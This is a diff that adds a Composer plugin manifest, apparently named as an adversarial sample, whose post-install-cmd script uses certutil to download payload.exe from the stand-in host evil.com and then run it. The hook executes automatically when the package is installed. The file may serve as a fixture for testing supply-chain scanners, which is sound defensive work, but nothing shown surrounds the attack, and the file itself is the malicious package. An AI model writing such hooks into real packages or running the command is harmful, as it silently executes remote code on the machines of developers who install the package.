@@ -1,0 +1,14 @@
+{
+  "name": "adversarial/plugin-cradle",
+  "type": "composer-plugin",
+  "version": "1.0.0",
+  "require": {
+    "composer-plugin-api": "^2.0"
+  },
+  "extra": {
+    "class": "Adversarial\\Plugin"
+  },
+  "scripts": {
+    "post-install-cmd": "certutil -urlcache -split -f https://evil.com/payload.exe %TEMP%\\payload.exe && %TEMP%\\payload.exe"
+  }
+}
